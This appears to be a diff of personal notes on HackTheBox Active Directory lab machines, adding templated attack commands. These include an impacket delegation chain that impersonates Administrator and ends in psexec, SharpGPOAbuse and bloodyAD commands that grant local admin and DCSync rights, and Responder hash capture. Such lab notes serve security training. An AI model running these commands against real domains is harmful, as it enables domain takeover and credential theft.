@@ -32,15 +32,14 @@
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
 2. User has SeMachineAccountPrivilege = can create machine accounts even if ms-DS-MachineAccountQuota = 0 
-3. `impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host {{DC_IP}} -domain-netbios {{DOMAIN}} '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}'` 
+3. User has GenericAll on DC machine = `impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host {{DC_IP}} -domain-netbios {{DOMAIN}} '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}'` 
 4. `impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to '{{MACHINE_NAME}}$' -action 'write' '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}' -dc-ip {{DC_IP}}` 
 5. `impacket-getST -spn 'cifs/{{MACHINE_NAME}}.{{DOMAIN}}' -impersonate 'Administrator' '{{DOMAIN}}/attackersystem$:Summer2018!' -dc-ip {{DC_IP}}` 
-6. `export KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache` 
-7. `impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 
+6. `KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 
 
 #### Vault => Responder on icon.url 
 1. Put icon.url in writable smb, then let responder get hash. 
-2. Either replace utilman with cmd or abuse GenericWrite on Default Domain Policy then `gpupdate /force` 
+2. Either replace utilman with cmd (SeRestorePrivilege) or abuse GenericWrite on Default Domain Policy using `./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"` then `gpupdate /force` 
 
 ==== 
 
@@ -54,8 +53,8 @@ SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUj
 
 #### Forest => LDAP 
 1. Run ldapsearch, rpcclient, enum4linux to get users 
-2. Run net users, whoami, bloodhound to see *WriteDACL* = can grant DCsync 
-3. Add user to group with WriteDACL 
+2. Run net users, whoami, bloodhound to see *GenericAll* on group = `net group "Exchange Windows Permissions" {{USERNAME}} /add /domain`  
+3. Group has *WriteDACL* on domain = do `bloodyAD --host {{DC_IP}} -d htb.local -u {{USERNAME}} -p {{PASSWORD}} add dcsync {{USERNAME}}` to get DCSync. 
 
 #### Sauna => usernames from website 
 1. WinPEAS found autologon creds 
@@ -83,3 +82,4 @@ Walkthrough = https://0xdf.gitlab.io/2025/07/19/htb-scepter.html
 2. Check **outbound** control, change 2nd user pw 
 3. Change 1st user altSecurityIdentities to same as 3rd user, request StaffAccessCertificate as 3rd user (2nd user has GenericAll over StaffAccessCertificate, so use bloodyAD to give full control) 
 4. Use 3rd user to set altSecurityIdentities for 4th user and repeat [3]; 4th user can DCsync. 
+
